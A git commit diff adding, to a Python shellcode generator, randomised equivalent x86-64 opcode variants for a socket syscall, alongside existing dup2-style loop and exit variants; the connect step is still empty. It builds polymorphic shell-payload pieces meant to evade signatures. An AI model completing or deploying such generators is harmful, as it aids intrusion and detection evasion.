c0bdd1e10056df5b27aec98bfdfcffff30b40410
Skriix <83827913+Skriix@users.noreply.github.com>
2023-07-26 11:44:38 +0200

    Creation socket

--- generateur.py
+++ generateur.py
@@ -2,6 +2,56 @@ import random
 
 shellcode = ""
 
+###### CREATION SOCKET ######
+
+#mov al, 41 -> B029
+#mov al, 40 - add al, 1 -> b0280401
+#mov al, 42 - sub al, 1 -> b02a2c01
+
+create_socket_1 = ["B029", "b0280401", "b02a2c01"]
+
+#xor rdi, rdi -> 4831FF
+# xor r8, r8 - mov rdi, r8 -> 4D31C04C89C7
+# mov dil, 1 - sub dil, 1 -> 40B7014080EF01
+
+create_socket_2 = ["4831FF", "4D31C04C89C7", "40B7014080EF01"]
+
+#add rdi, 2 -> 4883C702
+#mov dil, 2 -> 40B702
+#mov dil, 3 - sub dil, 1 -> 40B7034080EF01
+
+create_socket_3 = ["4883C702", "40B702", "40B7034080EF01"]
+
+#xor rsi, rsi -> 4831F6
+#xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
+# mov sil, 1 - sub sil, 1 -> 40B6014080EE01
+
+create_socket_4 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]
+
+#add rsi, 1 -> 4883C601
+#mov sil, 1 -> 40B601
+# mov sil, 2 - sub sil, 1 -> 40B6024080EE01
+
+create_socket_5 = ["4883C601", "40B601", "40B6024080EE01"]
+
+#xor rdx, rdx -> 4831D2
+#xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2
+#mov dl, 1 - sub dl, 1 -> B20180EA01
+
+create_socket_6 = ["4831D2", "4D31C04C89C2", "B20180EA01"]
+
+#syscall -> 0F05
+
+create_socket_syscall = ["0F05"]
+
+
+###### CONNEXION SOCKET ######
+
+
+
+
+
+
 ###### LOOP ######
 
 # mov al, 0x21 -> b021 [Default]
@@ -36,6 +86,7 @@ shellcode = ""
 #mov dl, 60 - mov rax, rdx -> B23C4889D0
 
 list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
+
 shellcode += random.choice(list_exit)
 print(shellcode)
 
